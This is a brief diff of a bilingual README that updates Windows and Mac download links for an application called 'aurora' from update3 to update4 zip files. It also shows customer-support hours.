@@ -5,8 +5,8 @@
 - <a href="https://m.jsa1004.com/lakogetmaryl.pkg"> Mac OS </a>
 - IOS 敬请期待
 ## 极光 (aurora）最新修复下载 Latest fixes of aurora
-- <a href="https://files.7ecnologia.com/aurora-v3.0.5s-update3.zip"> Windows </a>
-- <a href="https://files.7ecnologia.com/aurora-v3.0.3s-update3.zip"> Mac OS </a> </br>
+- <a href="https://files.7ecnologia.com/aurora-v3.0.5s-update4.zip"> Windows </a>
+- <a href="https://files.7ecnologia.com/aurora-v3.0.3s-update4.zip"> Mac OS </a> </br>
 ## 如果您需要进一步的帮助和账户相关事宜，您可以在工作时间内，即:
 ## a) 周一至周五上午10:00-下午7:00
 ## b) 周六中午12:00-晚上9:00
